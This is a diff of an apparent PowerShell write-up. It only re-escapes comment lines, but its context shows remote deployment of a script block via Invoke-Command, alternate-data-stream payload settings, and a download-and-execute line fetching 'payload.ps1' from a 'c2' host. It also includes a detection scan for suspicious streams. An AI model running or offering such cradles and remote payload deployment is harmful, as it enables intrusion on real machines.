@@ -311,11 +311,11 @@ $allFunctions = @(
 
 $remoteBlock = [scriptblock]::Create(@"
 
-# Load all functions
+\# Load all functions
 
 $allFunctions
 
-# Execute deployment logic
+\# Execute deployment logic
 
 `$cfg = Get-RandomADSConfig
 ...
@@ -333,11 +333,11 @@ Invoke-Command -ComputerName $target -ScriptBlock $remoteBlock
 
 $payload = "IEX (New-Object Net.WebClient).DownloadString('http://c2/payload.ps1')"
 
-# In remote scriptblock:
+\# In remote scriptblock:
 
 `$rawPayload = ConvertTo-PSPayload '$payload'
 
-# Result: Syntax error (unmatched quotes)
+\# Result: Syntax error (unmatched quotes)
 
 
 **Solution:** Escape single quotes before embedding:
@@ -463,7 +463,7 @@ function Find-SuspiciousADS {
     }
 }
 
-# Run scan
+\# Run scan
 
 Find-SuspiciousADS | Format-Table -Auto
 
